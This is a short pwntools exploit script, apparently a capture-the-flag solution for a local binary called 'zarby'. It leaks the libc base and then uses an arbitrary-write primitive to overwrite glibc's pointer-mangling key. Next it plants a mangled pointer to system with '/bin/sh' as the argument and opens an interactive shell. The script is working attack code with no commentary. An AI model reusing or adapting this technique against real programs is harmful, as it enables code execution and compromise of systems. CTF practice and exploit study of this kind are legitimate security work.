from pwn import *

elf = ELF('./zarby', checksec=False)
libc= ELF('./libs/libc.so.6', checksec=False)
global p

def rol11(value):
    res = (value << 0x11 % 64) & (2**64 - 1) | ((value & (2**64-1)) >> (64-(0x11%64)))
    return res


def www(addr, content):
    p.sendline(b"%i %i" % (addr, content))


p = process(elf.path)



p.recvuntil(b"system@libc: ")

libc.address = int(p.recvline().strip(),0) - libc.sym.system


info("libc @0x%hx" % libc.address)


called_addr = 2065176+libc.address
key         = libc.address-10384
rdi         = libc.address+2065184

pause()



www(key, 0xdeadbeefdeadbeef)
www(called_addr, rol11(libc.sym.system ^ 0xdeadbeefdeadbeef))
www(rdi, next(libc.search(b"/bin/sh\0")))


p.interactive()
